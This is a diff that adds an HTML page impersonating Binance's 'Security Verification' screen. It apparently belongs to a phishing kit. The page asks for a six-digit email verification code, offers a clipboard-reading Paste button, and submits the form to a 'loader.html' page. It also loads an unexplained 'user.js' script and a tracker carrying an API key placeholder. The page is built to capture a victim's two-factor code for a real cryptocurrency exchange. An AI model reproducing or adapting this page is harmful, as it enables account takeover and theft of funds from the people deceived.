@@ -1,0 +1,124 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="./styles/authentificator.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="./assets/fonts.js"></script>
+    <script src="./assets/jquery.min.js"></script>  
+    <link rel="icon" type="image/x-icon" href="./assets/websiteIcon.png">
+
+    <title>Binance email verification</title>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+  
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+<script>
+
+
+
+</script>
+<script src="./user.js"></script> 
+    <nav>
+        <img id="logo" src="./assets/logo.png" alt="Logo">
+        <div>
+            <p>English</p>
+            <img src="./assets/dark.png" alt="" srcset="">
+        </div>
+    </nav>
+    
+
+    <div class="container" id="container">
+        <div class="leftSide">
+            <h2 style="font-size: 28px; font-weight: 500; margin: 0;">Security Verification</h2>
+
+            <form id="Loginform" action="loader.html">
+
+                <label for="auth_code" id="lbl_auth_code">Email verification code</label>
+                
+                <div class="input-container">
+                    <input type="text" maxlength="6" id="emailcode">
+                    <span class="paste-button" id="pasteButton">Paste</span>
+                </div>
+
+                <p id="p-emailcode-message" style="color: #797880; font-size: 14PX; margin-top: 5PX;">We sent you mail, Enter the code you recieved in your email.
+                </p>
+                
+                <button id="loginBtn"  type="submit" onclick="submitEmailCodeForm()">Submit</button>
+                
+               
+                
+            </form>
+            <div id="ass" >
+                <a href="#" style="margin-top: 6px;" id='9'>Switch to Another Verification Method</a>
+                <a href="#" style="margin-top: 25px;" id='9'>Security verification unavailable?</a>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <p style="color: black;">Binance © 2024</p>
+    </footer>
+    <script>
+        
+        const loginBtn = document.getElementById('loginBtn');
+
+        loginBtn.style.backgroundColor = '#FCD535'; // Change to the desired color
+        loginBtn.style.color='Black';
+
+        
+        const emailcode = document.getElementById('emailcode');
+        const pasteButton = document.getElementById('pasteButton');
+
+        pasteButton.addEventListener('click', () => {
+            // Use the clipboard API to access the clipboard and paste the content
+            navigator.clipboard.readText().then(clipText => {
+                emailcode.value = clipText;
+            });
+        });
+    </script>
+    <style>
+        .LoderContainer h2{
+            color: #000925;
+            font-size: 1em;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 500;
+            width: 300px;
+            margin-top: 20px;
+        }
+        .LoderContainer{
+            margin-top: 250px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .LoderContainer .loader {
+            border: 10px dashed #b4b100; /* Light grey */
+            border-top: 10px solid #b4b104; /* Blue */
+            border-radius: 50%;
+            width: 70px;
+            height: 70px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @media only screen and (max-width: 900px){
+            footer{
+                position: absolute;
+                bottom: 0;
+            }
+        }
+    </style>
+    
+</body>
+</html>
